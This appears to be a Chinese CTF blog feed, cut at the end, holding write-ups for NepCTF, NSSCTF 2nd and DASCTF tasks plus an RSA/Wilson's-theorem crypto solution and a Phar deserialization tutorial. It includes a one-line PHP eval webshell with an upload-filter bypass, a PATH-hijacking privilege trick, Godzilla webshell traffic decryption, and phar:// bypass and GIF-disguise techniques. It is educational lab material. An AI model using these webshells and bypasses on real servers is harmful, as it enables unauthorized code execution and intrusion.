src="/img/image-20230813195139592.png"></p><p>歪脖子看的mos</p><p>解完，转小写，大写解密的时候是乱码</p><blockquote><p>youshouldusethistoxorsomething</p></blockquote><p><img src="/img/image-20230813195205771.png"></p><p>歪脖子看的0x</p><blockquote><p>0x370A05303C290E045005031C2B1858473A5F052117032C39230F005D1E17</p></blockquote><p><img src="/img/image-20230813201543056.png"></p><h2 id="你也喜欢三⽉七吗"><a href="#你也喜欢三⽉七吗" class="headerlink" title="你也喜欢三⽉七吗"></a>你也喜欢三⽉七吗</h2><blockquote><p>Nepnep星球如约举办CTF大赛，消息传播至各大星球，开拓者一行人应邀而来 ———————————————————————————————————————</p><p>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</p><p>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</p><p>三月七：那我们快想想怎么解开这个谜题！</p><p>flag格式:NepCTF{+m+}</p><p>hint:URL为压缩包密码</p></blockquote><p>题目</p><pre><code>salt_lenth= 10 key_lenth= 16 iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</code></pre><p>根据描述</p><p>群名：NepCTF2023</p><p>正好十位猜测为盐，sha256一下</p><blockquote><p>dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</p></blockquote><p><img src="/img/image-20230813204137440.png"></p><p>访问是个图片</p><p><img src="/img/image-20230813204155809.png"></p><p>星穹铁道文！（</p><p><img src="/img/image-20230813204246800.png"></p><blockquote><p>NepCTF{HRP_aiways_likes_March_7th}</p></blockquote><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h2><p>Shiro 550的洞，梭</p><p><img src="/img/image-20230813202217240.png"></p><p>flag在start.sh里，属于非预期解，正解是提权拿到flag</p><p>也不排除就是这个考点（</p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a>独步天下-转生成为镜花水月中的王者</h2><blockquote><p>echo “cat &#x2F;flag” &gt; &#x2F;tmp&#x2F;ports-alive</p><p>export PATH&#x3D;&#x2F;tmp:$PATH</p><p>chomd 777 &#x2F;tmp&#x2F;ports-alive</p><p>nmap -h</p></blockquote><p><img src="/img/image-20230813205902473.png"></p><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="HRP-CHAT-4"><a href="#HRP-CHAT-4" class="headerlink" title="HRP-CHAT-4"></a>HRP-CHAT-4</h2><p>Login进去后去Shop一直买0元商品</p><p>让主线程内存溢出到子线程</p><p><img src="/img/image-20230813204447734.png"></p><p>满足if之后</p><p>拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-2nd</title>
      <link href="/2023/08/29/NSSCTF-2nd/"/>
      <url>/2023/08/29/NSSCTF-2nd/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSCTF-2nd"><a href="#NSSCTF-2nd" class="headerlink" title="NSSCTF 2nd"></a>NSSCTF 2nd</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="php签到"><a href="#php签到" class="headerlink" title="php签到"></a>php签到</h2><p><strong>filename是经过urldecode过的。因此可以用<code>a.php%2f.</code>来绕过检查</strong></p><h3 id="上传表单"><a href="#上传表单" class="headerlink" title="上传表单"></a>上传表单</h3><p>上传一句话木马</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://node6.anna.nssctf.cn:28552/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h3><pre><code class="php">&lt;?php @eval($_POST[&#39;1&#39;]);?&gt;</code></pre><p>抓包，把文件名改为1.php&#x2F;.</p><p>(url编码)变为%31%2e%70%68%70%2f%2e</p><p>访问&#x2F;1.php，命令执行得到flag</p><pre><code class="php">1=system(&#39;env&#39;);</code></pre><h2 id="2周年快乐！"><a href="#2周年快乐！" class="headerlink" title="2周年快乐！"></a>2周年快乐！</h2><p>D盘有暗示,桌面的获取flag</p><p><img src="/img/XMZY3JNSM%60FU3OW1FW@GYJ.jpg"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h2><p>直接 <code>docker run --rm -it randark/nssctf-round15-magic-docker /bin/bash</code> 进bash里cat &#x2F;flag就行了。</p><h2 id="gift-in-qrcode"><a href="#gift-in-qrcode" class="headerlink" title="gift_in_qrcode"></a>gift_in_qrcode</h2><p>有 print(target) ， 所以 cv就行。</p><h1 id="CRY"><a href="#CRY" class="headerlink" title="CRY"></a>CRY</h1><h2 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h2><p> c 很短，并且指数 e &#x3D; 3， 直接尝试开 3 次根即可得到 flag </p><pre><code class="python">import gmpy2import libnumdef de(c, e, n):    k = 0    while True:        mm = c + n*k        result, flag = gmpy2.iroot(mm, e)        if True == flag:            return result        k += 1e= 3n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077m=de(c,e,n)print(m)print(libnum.n2s(int(m)).decode())</code></pre><pre><code class="python"># sagefrom Crypto.Util.number import long_to_bytes, bytes_to_longn = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077m = c.nth_root(3)print(long_to_bytes(m))</code></pre><h2 id="FunnyEncrypt"><a href="#FunnyEncrypt" class="headerlink" title="FunnyEncrypt"></a>FunnyEncrypt</h2><p>统计了一下字符，发现特殊符号刚好 26 个，猜测是 26 个字母进行了替换，直接替换成字母，然后进行频率攻击即可:</p><pre><code class="python">ct = &quot;&quot;&quot;✧✡✭✡✮ ✣✴✯ ✤✶✬✬✱ ✬✤ ✱✦✢✥✮✯✧✧, ✴✬✷✯ ✡✧ ✣✴✯ ✶✡✰✴✣. ✡✣ ❂✢✡✮✰✧ ✩✬✸✤✬✢✣, ✤✦✡✣✴, ✦✮✱ ✩✬✮✤✡✱✯✮✩✯. ✡✣ ✰✡✲✯✧ ✳✧ ✰✳✡✱✦✮✩✯ ★✴✯✮ ★✯ ✦✢✯ ✶✬✧✣, ✦✮✱ ✰✡✲✯✧ ✧✳✷✷✬✢✣ ★✴✯✮ ★✯ ✦✢✯ ✦✤✢✦✡✱. ✦✮✱ ✣✴✯ ✸✬✸✯✮✣ ★✯ ✰✡✲✯ ✳✷ ✴✬✷✯, ★✯ ✰✡✲✯ ✳✷ ✬✳✢ ✶✡✲✯✧. ✣✴✯ ★✬✢✶✱ ★✯ ✶✡✲✯ ✡✮ ✡✧ ✱✡✧✡✮✣✯✰✢✦✣✡✮✰ ✡✮✣✬ ✦ ✷✶✦✩✯ ✬✤ ✸✦✶✡✩✯ ✦✮✱ ✴✦✣✢✯✱, ★✴✯✢✯ ★✯ ✮✯✯✱ ✴✬✷✯ ✦✮✱ ✤✡✮✱ ✡✣ ✴✦✢✱✯✢. ✡✮ ✣✴✡✧ ★✬✢✶✱ ✬✤ ✤✯✦✢, ✴✬✷✯ ✣✬ ✤✡✮✱ ❂✯✣✣✯✢, ❂✳✣ ✯✦✧✡✯✢ ✧✦✡✱ ✣✴✦✮ ✱✬✮✯, ✣✴✯ ✸✬✢✯ ✸✯✦✮✡✮✰✤✳✶ ✶✡✤✯ ✬✤ ✤✦✡✣✴ ★✡✶✶ ✸✦✥✯ ✶✡✤✯ ✸✯✦✮✡✮✰✤✳✶.✧✬✸✯✣✡✸✯✧ ★✯ ✣✴✡✮✥ ✬✤ ✱✢✯✦✸✧ ✦✧ ✤✦✮✣✦✧✡✯✧ - ✡✣&#39;✧ ✯✦✧✵ ✣✬ ✱✬ ★✴✯✮ ✵✬✳ ✴✦✲✯ ✸✬✮✯✵, ✢✯✮✣, ✦✮✱ ★✬✢✥. ❂✳✣ ✵✬✳ ✩✦✮&#39;✣ ✷✢✯✷✦✢✯ ✵✬✳✢✧✯✶✤ ✦✮✱ ✫✳✸✷ ✬✤✤ ✣✴✯ ✩✶✡✤✤: ✵✬✳ ✧✴✬✳✶✱ ✰✢✬★ ✵✬✳✢ ★✡✮✰✧ ✤✡✢✧✣. ✦ ✶✡✣✣✶✯ ❂✡✣ ✣✬★✦✢✱ ✣✴✯ ✱✢✯✦✸. ✧✣✯✷ ❂✵ ✧✣✯✷. ✣✦✥✯ ✦ ✧✣✯✷ ✤✬✢★✦✢✱. ✦✤✣✯✢ ✦✶✶, ✡✣&#39;✧ ✵✬✳✢ ✸✡✧✧✡✬✮.✥✯✯✷ ✤✦✡✣✴ ✦✮✱ ✴✬✷✯ ✤✬✢ ✣✴✯ ✤✳✣✳✢✯. ✸✦✥✯ ✵✬✳✢ ✸✬✧✣ ✧✡✮✩✯✢✯ ✱✢✯✦✸✧, ✦✮✱ ★✴✯✮ ✣✴✯ ✬✷✷✬✢✣✳✮✡✣✡✯✧ ✩✬✸✯, ✣✴✯✵ ★✡✶✶ ✤✡✰✴✣ ✤✬✢ ✣✴✯✸. ✡✣ ✸✦✵ ✣✦✥✯ ✦ ✧✯✦✧✬✮ ✬✢ ✸✬✢✯, ❂✳✣ ✣✴✯ ✯✮✱✡✮✰ ★✡✶✶ ✮✬✣ ✩✴✦✮✰✯. ✦✸❂✡✣✡✬✮, ❂✯✧✣, ❂✯✩✬✸✯ ✦ ✢✯✦✶✡✣✵. ✦✮ ✳✮✩✯✢✣✦✡✮ ✤✳✣✳✢✯, ✬✮✶✵ ✬✮✯ ✧✣✯✷ ✦✣ ✦ ✣✡✸✯, ✣✴✯ ✴✬✷✯ ✩✦✮ ✢✯✦✶✡✪✯ ✣✴✯ ✱✢✯✦✸ ✬✤ ✣✴✯ ✴✡✰✴✯✧✣. ★✯ ✸✳✧✣ ✣✢✯✦✧✳✢✯ ✣✴✯ ✱✢✯✦✸, ✣✬ ✷✢✬✣✯✩✣ ✡✣ ✦ ✧✯✦✧✬✮, ✶✯✣ ✡✣ ✡✮ ✣✴✯ ✴✯✦✢✣ ❋✳✡✯✣✶✵ ✰✯✢✸✡✮✦✶.✬✮✶✵ ★✴✯✮ ✵✬✳ ✳✮✱✯✢✧✣✦✮✱ ✣✴✯ ✣✢✳✯ ✸✯✦✮✡✮✰ ✬✤ ✶✡✤✯ ✩✦✮ ✵✬✳ ✶✡✲✯ ✣✢✳✶✵. ❂✡✣✣✯✢✧★✯✯✣ ✦✧ ✶✡✤✯ ✡✧, ✡✣&#39;✧ ✧✣✡✶✶ ★✬✮✱✯✢✤✳✶, ✦✮✱ ✡✣&#39;✧ ✤✦✧✩✡✮✦✣✡✮✰ ✯✲✯✮ ✡✮ ✣✢✦✰✯✱✵. ✡✤ ✵✬✳&#39;✢✯ ✫✳✧✣ ✦✶✡✲✯, ✣✢✵ ✴✦✢✱✯✢ ✦✮✱ ✣✢✵ ✣✬ ✶✡✲✯ ★✬✮✱✯✢✤✳✶✶✵.✡ ❂✯✶✡✯✲✯ ✣✴✯✢✯ ✡✧ ✦ ✷✯✢✧✬✮ ★✴✬ ❂✢✡✮✰✧ ✧✳✮✧✴✡✮✯ ✡✮✣✬ ✵✬✳✢ ✶✡✤✯. ✣✴✦✣ ✷✯✢✧✬✮ ✸✦✵ ✴✦✲✯ ✯✮✬✳✰✴ ✣✬ ✧✷✢✯✦✱ ✦✢✬✳✮✱. ❂✳✣ ✡✤ ✵✬✳ ✢✯✦✶✶✵ ✴✦✲✯ ✣✬ ★✦✡✣ ✤✬✢ ✧✬✸✯✬✮✯ ✣✬ ❂✢✡✮✰ ✵✬✳ ✣✴✯ ✧✳✮ ✦✮✱ ✰✡✲✯ ✵✬✳ ✦ ✰✬✬✱ ✤✯✯✶✡✮✰, ✣✴✯✮ ✵✬✳ ✸✦✵ ✴✦✲✯ ✣✬ ★✦✡✣ ✦ ✶✬✮✰ ✣✡✸✯.✡✮ ✦ ★✬✢✱,✡ ✴✬✷✯ ✵✬✳ ★✡✶✶ ✶✡✥✯ ✩✢✵✷✣✬✰✢✦✷✴✵.✣✴✡✧ ✡✧ ✵✬✳✢ ✤✶✦✰:✮✧✧✩✣✤&#123;✩✢✵✷✣✬_✡✧_✧✬_✡✮✣✯✢✯✧✣✡✮✰_★✴✵_✱✬✮&#39;✣_✵✬✳_✫✬✡✮_✳✧&#125;&quot;&quot;&quot;sets = set()for c in ct:    sets.add(c)table = []for s in sets:    if ord(s) &gt; 256:        table.append(ord(s))table.sort()dicts = &#123;&#125;for i, ch in enumerate(table):    dicts[ch] = chr(ord(&quot;a&quot;) + i)res = &quot;&quot;for c in ct:    if ord(c) in dicts:        res += dicts[ord(c)]    else:        res += cprint(res)</code></pre><p><a href="https://quipqiup.com/">https://quipqiup.com/</a> 分析</p><p><img src="/img/image-20230831091333986.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HK的怪兽</title>
      <link href="/2023/08/09/HK/"/>
      <url>/2023/08/09/HK/</url>
      
        <content type="html"><![CDATA[<h2 id="DASCTF-HK的怪兽"><a href="#DASCTF-HK的怪兽" class="headerlink" title="DASCTF-HK的怪兽"></a>DASCTF-HK的怪兽</h2><p>解压后一个zip一个流量包</p><p>zip里有提示</p><p><img src="/img/image-20230809003944323.png"></p><p>去流量包里找找key</p><p><img src="/img/image-20230809004140426.png"></p><blockquote><p>$key&#x3D;9854e8aa5568e23c</p></blockquote><p>解压完但是不知道是个什么东西</p><p><img src="/img/image-20230809004449371.png"></p><p>看了一眼http流，发现了一串字符串50 4B 03 04 一眼压缩包</p><p><img src="/img/image-20230809004544363.png"></p><p>尝试之前的密码解密</p><p>果然不行</p><p><strong>题目有提示：压缩包好像有点多哦，找不到密码时可以去看看命令执行了些什么</strong></p><p>shell.php嘛，但是发现里面的命令都被加密了，这里要对哥斯拉webshell进行解密</p><h3 id="附脚本"><a href="#附脚本" class="headerlink" title="附脚本"></a>附脚本</h3><h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><pre><code class="php">&lt;?phpfunction encode($D,$K)&#123;    for($i=0;$i&lt;strlen($D);$i++) &#123;        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    &#125;    return $D;&#125;function isGzipStream($bin)&#123;    if (strlen($bin)&gt;=2)&#123;        $bin=substr($bin,0,2);        $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        switch ($typeCode) &#123;            case 31139:                return true;                break;            default:                return false;        &#125;    &#125;else&#123;        return false;    &#125;&#125;$pass = &quot;POST内容&quot;;$key=&#39;替换自己的key&#39;;$data=encode(base64_decode($pass),$key);if(isGzipStream($data))&#123;    echo &quot;666\n&quot;;    echo gzdecode($data);&#125;else&#123;    echo $data;&#125;?&gt;</code></pre><h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><pre><code class="php">&lt;?phpfunction encode($D,$K)&#123;    for($i=0;$i&lt;strlen($D);$i++) &#123;        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    &#125;    return $D;&#125;$key=&#39;自己的key&#39;;$a = &#39;需要解密的响应密文&#39;;$b = substr($a, 16, strlen($a)-32);echo gzdecode(encode(base64_decode($b), $key));</code></pre><p>提取出http包，带有DASCTF的是请求包，解密出一个 cat Pass1sHere.txt的命令</p><p>尝试用Pass1sHere解压，发现是个pem私钥文件</p><p>百度一下pem私钥文件</p><p><img src="/img/image-20230809134207806.png"></p><h4 id="openssl安装"><a href="#openssl安装" class="headerlink" title="openssl安装"></a><a href="https://zhuanlan.zhihu.com/p/42594396">openssl安装</a></h4><pre><code class="sh">tar -xzf openssl-3.0.0.tar.gzcd openssl-3.0.0mkdir /usr/local/openssl./config --prefix=/usr/local/opensslmakemake install</code></pre><p>创建软连接</p><pre><code class="sh">which openssl/usr/local/openssl/bin/openssl为了使用方便，以及以后版本更新方便，可以创建软连接，如下： ln -s /usr/local/openssl/bin/openssl /usr/bin/openssl</code></pre><p><a href="https://blog.csdn.net/qq_56438857/article/details/126028798">openssl使用</a></p><p> OpenSSL解密</p><pre><code class="bash">openssl pkeyutl -decrypt -in flag -inkey 1.pem -out 1.file</code></pre><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><blockquote><p>DASCTF{987787ad-5cf9-4909-b847-8dfb9d657988}</p></blockquote><p><a href="https://blog.csdn.net/p01son/article/details/132109005">come from</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> MISC </category>
          
          <category> Godzilla </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Godzilla </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wilson</title>
      <link href="/2023/08/07/Wilson/"/>
      <url>/2023/08/07/Wilson/</url>
      
        <content type="html"><![CDATA[<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><pre><code class="python">from Crypto.Util.number import *import sympyimport randomimport mathfrom secret import flagdef Ez_gen():    while True:        p = getPrime(512)        if p % 8 == 5:            break    g = p - random.randint(1 &lt;&lt; 13, 1 &lt;&lt; 15)    q = sympy.nextprime(math.gamma(g+1) % p)    return p, g, qp, g, q = Ez_gen()n = p*qe = 65537m = bytes_to_long(flag)c = pow(m, e, n)print(&#39;p =&#39;,p)print(&#39;g =&#39;,g)print(&#39;c =&#39;,c)&#39;&#39;&#39;p = 8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909q=5080691351756776836242625526020839978079858122358896789292451240656548263784446598519406936465684225294500549986872221545259642472273841656652442393744671g = 8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c = 20273826610248828471816620263935242916599811392952294789510432458232436282774505892136879333200094421932834521553702856733672026156598240143307573026502610708351303933403487535423369660966944529989140778550643762201072286590102924579003383999335893610314240369548339445594969039400911183669424431882906905501&#39;&#39;&#39;</code></pre><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><blockquote><p>伽马函数Γ(x)和阶乘x!的关系式,n为正整数<br>gamma(n)&#x3D;(n-1)!<br>#威尔逊定理<br>当且仅当p为素数时：(p-1)! ≡ -1 (mod p)<br>推论：(p-2)! ≡ 1 (mod p)<br>#欧拉函数若n是质数p的k次幂，<code>phi = p**k - p**(k-1)</code></p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>很明显我们要求q</p><p>也就是要求gamma(g+1)%p,</p><p>已知gamma(g+1)%p&#x3D;&#x3D;&#x3D;g!%p<br>根据威尔逊定理可知：(p-2)%p&#x3D;1<br>令x&#x3D;(p-2)！&#x2F;g！，y&#x3D;g!,所以(x*y)%p&#x3D;1<br>我们要求y%p,y是x关于p的逆元，所以求x%p的逆元就可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">import sympyimport gmpy2import libnump = 8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909g = 8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c = 20273826610248828471816620263935242916599811392952294789510432458232436282774505892136879333200094421932834521553702856733672026156598240143307573026502610708351303933403487535423369660966944529989140778550643762201072286590102924579003383999335893610314240369548339445594969039400911183669424431882906905501e=65537q=1max=(p-2)-gfor i in range(max):    q=q*gmpy2.invert((p-2-i),p)%p//x%p的逆元q=sympy.nextprime(q)//最终qn=p*qphi_n=(p-1)*(q-1)d=libnum.invmod(e,phi_n)m=pow(c,d,n)print(m)print(libnum.n2s(int(m)).decode())</code></pre><p><a href="http://cn-sec.com/archives/719539.html">come from</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> CRYPTO </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar</title>
      <link href="/2023/08/06/Phar/"/>
      <url>/2023/08/06/Phar/</url>
      
        <content type="html"><![CDATA[<h2 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h2><p>phar反序列化即在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<code>phar://伪协议</code>，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先了解一下phar文件的结构，一个phar文件由四部分构成：</p><ul><li>a <strong>stub</strong>：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</li><li>a <strong>manifest</strong> describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<strong>meta-data</strong>，这是上述攻击手法最核心的地方。</li><li>the file <strong>contents</strong>：被压缩文件的内容。</li><li>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)：签名，放在文件末尾</li></ul><p><img src="/img/image-20230806151253004.png"></p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>注意：如果想要生成Phar文件，要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成。</p><p><img src="/img/image-20230806164937902.png"></p><pre><code class="php">&lt;?php    class Test &#123;&#125;    $o = new Test();    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>可以看到meta-data是以序列化的形式存储的:</p><p><img src="/img/image-20230806151453642.png"></p><h2 id="影响的函数"><a href="#影响的函数" class="headerlink" title="影响的函数"></a>影响的函数</h2><p>知道创宇的seaii 更为我们指出了所有文件函数均可使用：</p><p><img src="/img/image-20230806151547280.png"></p><p>但实际上只要调用了<code>php_stream_open_wrapper</code>的函数，都存在这样的问题。</p><p>因此还有如下函数：</p><p><strong>exif</strong></p><ul><li><code>exif_thumbnail</code></li><li><code>exif_imagetype</code></li></ul><p><strong>gd</strong></p><ul><li><code>imageloadfont</code></li><li><code>imagecreatefrom</code></li></ul><p><strong>hash</strong></p><ul><li><code>hash_hmac_file</code></li><li><code>hash_file</code></li><li><code>hash_update_file</code></li><li><code>md5_file</code></li><li><code>sha1_file</code></li></ul><p><strong>file &#x2F; url</strong></p><ul><li><code>get_meta_tags</code></li><li><code>get_headers</code></li><li><code>mime_content_type</code></li></ul><p><strong>standard</strong></p><ul><li><code>getimagesize</code></li><li><code>getimagesizefromstring</code></li></ul><p><strong>finfo</strong></p><ul><li><code>finfo_file</code></li><li><code>finfo_buffer</code></li></ul><p><strong>zip</strong></p><pre><code class="php">$zip = new ZipArchive();$res = $zip-&gt;open(&#39;c.zip&#39;);$zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);</code></pre><p><strong>Postgres</strong></p><pre><code>&lt;?php$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));@$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar://test.phar/aa&#39;);</code></pre><p><strong>MySQL</strong></p><pre><code class="php">LOAD DATA LOCAL INFILE`也会触发这个`php_stream_open_wrapper&lt;?phpclass A &#123;    public $s = &#39;&#39;;    public function __wakeup () &#123;        system($this-&gt;s);    &#125;&#125;$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &#39;localhost&#39;, &#39;root&#39;, &#39;123456&#39;, &#39;easyweb&#39;, 3306);$p = mysqli_query($m, &#39;LOAD DATA LOCAL INFILE \&#39;phar://test.phar/test\&#39; INTO TABLE a  LINES TERMINATED BY \&#39;\r\n\&#39;  IGNORE 1 LINES;&#39;);</code></pre><p>再配置一下mysqld。（非默认配置）</p><pre><code class="php">[mysqld]local-infile=1secure_file_priv=&quot;&quot;</code></pre><h2 id="phar反序列化使用前提条件"><a href="#phar反序列化使用前提条件" class="headerlink" title="phar反序列化使用前提条件"></a>phar反序列化使用前提条件</h2><blockquote><ol><li>phar文件可上传</li><li>文件流操作函数如<code>file_exists(),file_get_content(),fopne()</code>要有可利用的魔法方法作为“跳板”。</li><li>文件流参数可控,且<code>phar://</code>协议可用。</li></ol></blockquote><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><p>（1）如果过滤了<code>phar://</code>协议怎么办呢？</p><p>有以下几种方法可以绕过：</p><ul><li><code>compress.bzip2://phar://</code></li><li><code>compress.zlib://phar:///</code></li><li><code>php://filter/resource=phar://</code></li></ul><p>（2）除此之外，我们还可以将phar伪造成其他格式的文件。</p><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码</p><p>对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：</p><pre><code class="php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>可以看到加了GIF89a文件头，从而使其伪装成gif文件：</p><p><img src="/img/image-20230806151706919.png"></p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="CISCN-2019华北Day1-Web1-Dropbox"><a href="#CISCN-2019华北Day1-Web1-Dropbox" class="headerlink" title="[CISCN 2019华北Day1]Web1(Dropbox)"></a>[CISCN 2019华北Day1]Web1(Dropbox)</h3><p>前期和Phar反序列化没有关系，是信息收集</p><p>进入题目后,首先简单的注册登录，进入以后我们发现左上角有一个上传文件的功能，然后我们先随便建个文档上传提交，发现它要求得文件类型只能是gif&#x2F;jpg&#x2F;png的类型，然后进一步测试发现，只更改文件后缀名是没有用的，需要抓包更改其Content-Type为image&#x2F;jpeg或其它图片格式的对应字符串。</p><p><img src="/img/image-20230806152127168.png"></p><p>然后我们就发现文件上传成功了。上传成功后我们发现对文件可以进行两个操作，下载和删除。一般来讲，我们看到下载这个字眼的时候，可以联想到这里是不是可能存在任意文件下载的漏洞。然后我们进一步抓包分析，发现果然如此。</p><p><img 